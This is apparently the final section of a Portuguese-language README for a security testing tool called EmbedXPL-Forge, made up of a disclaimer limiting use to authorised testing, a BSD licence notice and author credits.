EmbedXPL-Forge é destinado exclusivamente para testes de segurança autorizados e pesquisa. Use esta ferramenta apenas em sistemas que você possui ou tem permissão explícita e escrita para testar. Acesso não autorizado a sistemas computacionais é ilegal. Os autores não assumem responsabilidade por uso indevido.

## Licença

Licença BSD - veja [LICENSE](LICENSE) para detalhes.

---

**Autor:** André Henrique ([@mrhenrike](https://github.com/mrhenrike)) | [União Geek](https://github.com/Uniao-Geek)
